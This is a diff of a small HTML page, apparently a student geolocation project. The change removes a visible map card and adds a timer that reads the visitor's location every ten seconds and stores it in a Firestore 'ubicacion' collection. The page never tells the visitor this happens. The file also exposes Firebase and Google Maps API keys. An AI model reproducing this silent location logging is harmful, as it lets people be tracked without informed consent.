@@ -1,130 +1,132 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
-    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <script src="https://www.gstatic.com/firebasejs/7.9.3/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/7.9.3/firebase-firestore.js"></script>
 
     <title>Document</title>
     <style>
-        
         #map {
             height: 100%;
         }
 
-        html, body {
+        html,
+        body {
             height: 100%;
             padding: 0;
             margin: 0;
         }
 
         .background {
-         background-color:slategray;
-         }
+            background-color: slategray;
+        }
 
 
-        .map-container-5{
-overflow:hidden;
-padding-bottom:56.25%;
-position:relative;
-height:0;
-}
-.map-container-5 iframe{
-left:0;
-top:0;
-height:100%;
-width:100%;
-position:absolute;
-}
+        .map-container-5 {
+            overflow: hidden;
+            padding-bottom: 56.25%;
+            position: relative;
+            height: 0;
+        }
+
+        .map-container-5 iframe {
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 100%;
+            position: absolute;
+        }
     </style>
 </head>
+
 <body class="background">
 
     <nav class="navbar navbar-expand-sm bg-light">
         <a href="../index.html">
-        <img href="../index.html" src="../home.png" width="50px" height="50px"> 
+            <img href="../index.html" src="../home.png" width="50px" height="50px">
         </a>
-      <ul class="navbar-nav">
-          
-        <li class="nav-item">
-       <a class="nav-link" href="../index.html"> <h1> Home  </h1></a>
-        </li>
-        
-      </ul>
+        <ul class="navbar-nav">
+
+            <li class="nav-item">
+                <a class="nav-link" href="../index.html">
+                    <h1> Home </h1>
+                </a>
+            </li>
+
+        </ul>
     </nav>
     <br>
 
 
 
-    
 
- 
-<div class="row">
 
-    <div class="col-md-3"></div>
-    
-    <div class="col-md-6 mb-4">
-  
-    
-      <div class="card card-cascade narrower">
-  
-        <div class="card-image" style="background-image: url(https://www.diariodemorelos.com/noticias/sites/default/files/field/image/La%20nueva%20actualización%20de%20Google%20Maps%20mostrará%20tu%20velocidad%20en%20tiempo%20real.jpg)">
 
-        <div class="text-white d-flex h-100 mask blue-gradient-rgba">
-            <div class="first-content align-self-center p-3">
-              <h3  class="text-dark card-title">Mapa</h3>
-            </div>
-            <div class="second-content align-self-center mx-auto text-center">
-              <i class="far fa-money-bill-alt fa-3x"></i>
-            </div>
-          </div>
+    <div class="row">
+
+        <div class="col-md-3"></div>
+
+        <div class="col-md-6 mb-4">
+
+
+           
+
+
         </div>
 
-
-  
-
-  
-            
-  
-        </div>
- 
-  
-      </div>
-  
     </div>
 
     <div class="col-md-3"></div>
 
-  
-  </div>
-    
+
+    </div>
+
     <script>
 
-        var firebaseConfig = {
-    apiKey: "AIzaSyCwi-q9bfQXvbaquhwpqhPHeLSmRvCteQc",
-    authDomain: "sistemasgeo6754.firebaseapp.com",
-    databaseURL: "https://sistemasgeo6754.firebaseio.com",
-    projectId: "sistemasgeo6754",
-    storageBucket: "sistemasgeo6754.appspot.com",
-    messagingSenderId: "157934654192",
-    appId: "1:157934654192:web:cedb76184ba1acd17e6835"
-     };
-  // Initialize Firebase
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
-    
-        if (navigator.geolocation)
-        {navigator.geolocation.getCurrentPosition(coordanadascliente)}
 
-        function coordanadascliente(position){
-          db.collection('ubicacion').add({
+    
+
+        var firebaseConfig = {
+            apiKey: "AIzaSyCwi-q9bfQXvbaquhwpqhPHeLSmRvCteQc",
+            authDomain: "sistemasgeo6754.firebaseapp.com",
+            databaseURL: "https://sistemasgeo6754.firebaseio.com",
+            projectId: "sistemasgeo6754",
+            storageBucket: "sistemasgeo6754.appspot.com",
+            messagingSenderId: "157934654192",
+            appId: "1:157934654192:web:cedb76184ba1acd17e6835"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
         
-          lat : position.coords.latitude,
-          long : position.coords.longitude
-        })
+
+        if (navigator.geolocation) { 
+            navigator.geolocation.getCurrentPosition(coordanadascliente) 
+        }
+
+        if (navigator.geolocation) {
+                setInterval(function(){
+                    navigator.geolocation.getCurrentPosition(coordanadascliente)
+                },10000);
+               
+            }
+
+
+    
+        
+           
+
+        function coordanadascliente(position) {
+            db.collection('ubicacion').add({
+
+                lat: position.coords.latitude,
+                long: position.coords.longitude
+            })
         }
 
     </script>
@@ -132,11 +134,12 @@ position:absolute;
 
 
 
-    
+
     <script
         src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBBL_rCP3lkgspRRE29-Nx8N9yvdcoqvRo&callback&callback=initMap"
         async defer></script>
 
-     
+
 </body>
+
 </html>
